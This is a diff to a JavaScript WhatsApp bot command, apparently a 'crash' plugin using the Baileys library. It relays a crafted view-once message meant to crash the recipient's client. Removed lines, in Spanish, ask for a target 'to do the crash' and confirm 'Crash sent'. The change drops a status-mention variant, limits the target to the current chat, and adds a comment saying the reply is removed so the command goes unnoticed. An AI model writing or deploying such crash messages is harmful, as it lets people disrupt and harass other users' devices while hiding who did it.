@@ -1,13 +1,8 @@
 import crypto from 'crypto'
 import { generateWAMessageFromContent } from '@whiskeysockets/baileys'
 
-let handler = async (m, { conn, args }) => {
-  let isTarget = m.quoted?.sender || m.mentionedJid?.[0] || m.chat
-  let mention = args.includes('-m')
-
-  if (!isTarget) {
-    return m.reply('Debes mencionar o responder a alguien para hacer crash.')
-  }
+let handler = async (m, { conn }) => {
+  let isTarget = m.chat
 
   let msg = await generateWAMessageFromContent(isTarget, {
     viewOnceMessage: {
@@ -38,35 +33,11 @@ let handler = async (m, { conn, args }) => {
     }
   }, {})
 
-  // Enviamos directamente el mensaje al objetivo
   await conn.relayMessage(isTarget, msg.message, {
     messageId: msg.key.id
   })
 
-  // Si se pidió, se envía una "mención de estado"
-  if (mention) {
-    await conn.relayMessage(isTarget, {
-      statusMentionMessage: {
-        message: {
-          protocolMessage: {
-            key: msg.key,
-            fromMe: false,
-            participant: "0@s.whatsapp.net",
-            remoteJid: "status@broadcast",
-            type: 25
-          },
-          additionalNodes: [
-            {
-              tag: "meta",
-              attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" }
-            }
-          ]
-        }
-      }
-    }, {})
-  }
-
-  m.reply('Crash enviado')
+  // Sin reply para evitar que se note el comando
 }
 
 handler.command = ['cras']
